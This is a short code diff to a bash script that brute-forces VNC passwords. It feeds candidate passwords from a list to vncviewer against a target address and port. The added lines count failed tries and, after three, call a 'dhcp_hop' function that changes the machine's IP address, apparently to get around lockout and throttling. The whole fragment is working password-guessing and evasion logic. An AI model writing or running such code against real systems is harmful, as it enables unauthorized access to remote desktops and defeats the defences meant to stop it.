@@ -53,6 +53,7 @@ dhcp_hop(){
 
 if [[ connection -eq 1 ]]
 then
+	tries=0
 	pws=0
 	match=0
 	while read -r line; do
@@ -60,14 +61,16 @@ then
 		echo "Trying: ${line}"
 		vncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
 		sleep 1 # avoid throttling
+		tries=$((tries+1))
 		if netstat -na | grep 5900 | grep "TIME_WAIT"
 		then
 			pkill -f "vncviewer"
 			cat stdout.txt
-			if grep -q "rejected" stdout.txt
-			then	
+			if [[ $tries -eq 3 ]]
+			then
 				sleep 1 #must wait for query timeout
 				dhcp_hop
+				tries=0
 				echo $(hostname -I)
 			fi
 		elif netstat -na | grep 5900 | grep ESTABLISHED
